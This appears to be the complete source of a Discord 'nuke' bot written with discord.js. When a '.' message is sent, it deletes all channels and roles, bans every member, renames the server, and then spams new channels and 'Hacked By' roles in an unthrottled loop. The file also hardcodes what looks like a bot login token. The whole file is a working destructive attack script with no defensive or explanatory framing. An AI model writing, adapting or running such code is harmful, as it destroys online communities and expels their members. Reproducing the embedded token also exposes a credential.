const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("DarkMode UP");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("DARK MODE UP", "text");///////bo channel 
        message.guild.createChannel("DARK MODE UP", "voice");////bo voice
        message.guild.createRole({ name: "Hacked By " });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTc2MTExMzA3MzQwMjU5MzU5.GY56QE.k2TY7dz6XRoFaOrrZy1vVl4oxuipZjBoAMt5kc")
